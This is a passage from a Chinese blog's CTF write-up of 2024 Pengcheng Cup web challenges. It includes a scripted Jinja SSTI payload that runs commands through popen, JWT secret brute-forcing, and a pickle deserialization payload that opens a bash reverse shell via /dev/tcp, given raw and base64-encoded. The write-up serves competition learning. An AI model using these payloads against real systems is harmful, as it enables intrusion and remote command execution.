@@ -1,0 +1,578 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="学弟们太强了\n口算 1s内算式，使用python算就行（直接使用eval不安全，大家不要学），然后可以得到hint：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @app.route('/') def index(solved=0): global current_expr # 前端计算 ..... ..... # 通过计算 username = 'ctfer!' if request.args.get('username'): username = request.args.get('username') if whitelist_filter(username,whitelist_patterns): if blacklist_filter(username): return render_template_string(&#34;filtered&#34;) else: print(&#34;你过关！&#34;) else: return render_template_string(&#34;filtered&#34;) return render_template('index.html', username=username, hint=&#34;f4dd790b-bc4e-48de-b717-903d433c597f&#34;) 可以看到有一个ssti盲打，主要是空格等被过滤了，用十六进制绕过，因为popen里面还有一段python代码需要执行，因此需要eval：\n"><title>2024鹏城杯Web题解</title>
+<link rel=canonical href=https://k1te.cn/p/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E9%A2%98%E8%A7%A3/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="2024鹏城杯Web题解"><meta property='og:description' content="学弟们太强了\n口算 1s内算式，使用python算就行（直接使用eval不安全，大家不要学），然后可以得到hint：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @app.route('/') def index(solved=0): global current_expr # 前端计算 ..... ..... # 通过计算 username = 'ctfer!' if request.args.get('username'): username = request.args.get('username') if whitelist_filter(username,whitelist_patterns): if blacklist_filter(username): return render_template_string(&#34;filtered&#34;) else: print(&#34;你过关！&#34;) else: return render_template_string(&#34;filtered&#34;) return render_template('index.html', username=username, hint=&#34;f4dd790b-bc4e-48de-b717-903d433c597f&#34;) 可以看到有一个ssti盲打，主要是空格等被过滤了，用十六进制绕过，因为popen里面还有一段python代码需要执行，因此需要eval：\n"><meta property='og:url' content='https://k1te.cn/p/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E9%A2%98%E8%A7%A3/'><meta property='og:site_name' content="k1te's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='wp'><meta property='article:tag' content='ssti'><meta property='article:tag' content='jwt'><meta property='article:tag' content='pickle'><meta property='article:tag' content='nodejs'><meta property='article:tag' content='laravel'><meta property='article:tag' content='AFR'><meta property='article:published_time' content='2024-11-12T20:17:54+08:00'><meta property='article:modified_time' content='2024-11-12T20:17:54+08:00'><meta name=twitter:title content="2024鹏城杯Web题解"><meta name=twitter:description content="学弟们太强了\n口算 1s内算式，使用python算就行（直接使用eval不安全，大家不要学），然后可以得到hint：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @app.route('/') def index(solved=0): global current_expr # 前端计算 ..... ..... # 通过计算 username = 'ctfer!' if request.args.get('username'): username = request.args.get('username') if whitelist_filter(username,whitelist_patterns): if blacklist_filter(username): return render_template_string(&#34;filtered&#34;) else: print(&#34;你过关！&#34;) else: return render_template_string(&#34;filtered&#34;) return render_template('index.html', username=username, hint=&#34;f4dd790b-bc4e-48de-b717-903d433c597f&#34;) 可以看到有一个ssti盲打，主要是空格等被过滤了，用十六进制绕过，因为popen里面还有一段python代码需要执行，因此需要eval：\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu1583280794707635411.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎯</span></figure><div class=site-meta><h1 class=site-name><a href=/>k1te's blog</a></h1><h2 class=site-description>Whereof one cannot speak, thereof one must be silent.</h2></div></header><ol class=menu-social><li><a href=https://github.com/zk1te target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><ol><li><a href=#口算>口算</a></li><li><a href=#ez_python>ez_python</a></li><li><a href=#not-admin>not admin</a></li><li><a href=#fileread>fileread</a></li><li><a href=#lookup>LookUp</a></li><li><a href=#ezlaravel>ezLaravel</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E9%A2%98%E8%A7%A3/>题解</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E9%A2%98%E8%A7%A3/>2024鹏城杯Web题解</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Nov 12, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 4 分钟</time></div></footer></div></header><section class=article-content><p>学弟们太强了</p><h3 id=口算>口算</h3><p>1s内算式，使用python算就行（直接使用eval不安全，大家不要学），然后可以得到hint：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>(</span><span class=n>solved</span><span class=o>=</span><span class=mi>0</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>current_expr</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 前端计算</span>
+</span></span><span class=line><span class=cl>    <span class=o>.....</span>
+</span></span><span class=line><span class=cl>    <span class=o>.....</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 通过计算</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=s1>&#39;ctfer!&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>whitelist_filter</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>whitelist_patterns</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>blacklist_filter</span><span class=p>(</span><span class=n>username</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s2>&#34;filtered&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;你过关！&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s2>&#34;filtered&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>username</span><span class=o>=</span><span class=n>username</span><span class=p>,</span> <span class=n>hint</span><span class=o>=</span><span class=s2>&#34;f4dd790b-bc4e-48de-b717-903d433c597f&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以看到有一个ssti盲打，主要是空格等被过滤了，用十六进制绕过，因为<code>popen</code>里面还有一段python代码需要执行，因此需要<code>eval</code>：</p><p>（明明hint中是get参数，结果实际上是post，懵了半天）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;http://192.168.18.28/calc&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;cat /flag&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>cmd</span><span class=o>=</span><span class=n>cmd</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;{{g.pop.__globals__.__builtins__[&#39;eval&#39;](</span><span class=se>\&#34;</span><span class=s2>__import__(&#39;os&#39;).popen(bytes.fromhex(&#39;636174202f666c6167&#39;).decode()).read()</span><span class=se>\&#34;</span><span class=s2>)}}&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s2>&#34;http://192.168.18.28/?Submit=</span><span class=si>%E</span><span class=s2>6</span><span class=si>%8F%90%</span><span class=s2>E4%BA%A4&amp;answer=&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>result</span><span class=p>),</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=ez_python>ez_python</h3><p>扫出一个login路由，爆破得到账号<code>test:123456</code>，返回一个token：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ0ZXN0IiwiZXhwIjoxNzMxMTIwMTQ5fQ.OXE4Os6vL6dZ8KyWeH-CUDKmIBSvUIv15luP8VqXF8o
+</span></span></code></pre></td></tr></table></div></div><p>直接爆破可以得到密钥<code>a123456</code>，修改jwt为admin之后返回“听说ser有点东西”</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20241109141937516.png loading=lazy></p><p>访问ser路由得到一个pickle反序列化</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20241109141959146.png loading=lazy></p><p>随便找个payload打就行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(S&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/xxx/8888 0&gt;&amp;1&#34;&#39;
+</span></span><span class=line><span class=cl>ios
+</span></span><span class=line><span class=cl>system
+</span></span><span class=line><span class=cl>.
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{&#34;pickled&#34;:&#34;KFMnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC94eHgvODg4OCAwPiYxIicNCmlvcw0Kc3lzdGVtDQou&#34;}
+</span></span></code></pre></td></tr></table></div></div><h3 id=not-admin>not admin</h3><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>bodyParser</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;body-parser&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>jwt</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;jsonwebtoken&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=p>{</span> <span class=nx>User</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;./user&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>crypto</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;crypto&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>port</span> <span class=o>=</span> <span class=mi>3000</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s1>&#39;view engine&#39;</span><span class=p>,</span> <span class=s1>&#39;ejs&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s1>&#39;views&#39;</span><span class=p>,</span> <span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s1>&#39;views&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=kr>static</span><span class=p>(</span><span class=s1>&#39;public&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>bodyParser</span><span class=p>.</span><span class=nx>urlencoded</span><span class=p>({</span> <span class=nx>extended</span><span class=o>:</span> <span class=kc>true</span> <span class=p>}));</span>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=nx>json</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>tmp_user</span> <span class=o>=</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>authenticateToken</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>authHeader</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>headers</span><span class=p>[</span><span class=s1>&#39;authorization&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=nx>authHeader</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>tmp_user</span><span class=p>.</span><span class=nx>secretKey</span> <span class=o>==</span> <span class=kc>undefined</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>tmp_user</span><span class=p>.</span><span class=nx>secretKey</span> <span class=o>=</span> <span class=nx>crypto</span><span class=p>.</span><span class=nx>randomBytes</span><span class=p>(</span><span class=mi>16</span><span class=p>).</span><span class=nx>toString</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>token</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>decoded</span> <span class=o>=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>verify</span><span class=p>(</span><span class=nx>token</span><span class=p>,</span> <span class=nx>tmp_user</span><span class=p>.</span><span class=nx>secretKey</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>req</span><span class=p>.</span><span class=nx>user</span> <span class=o>=</span> <span class=nx>decoded</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>next</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>ex</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Invalid token.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>merge</span> <span class=o>=</span> <span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=nx>b</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>c</span> <span class=k>in</span> <span class=nx>b</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>b</span><span class=p>[</span><span class=nx>c</span><span class=p>]));</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>check</span><span class=p>(</span><span class=nx>b</span><span class=p>[</span><span class=nx>c</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>a</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=nx>c</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>b</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=nx>c</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>a</span><span class=p>[</span><span class=nx>c</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;object&#39;</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>b</span><span class=p>[</span><span class=nx>c</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;object&#39;</span><span class=p>)</span> <span class=p>{</span>
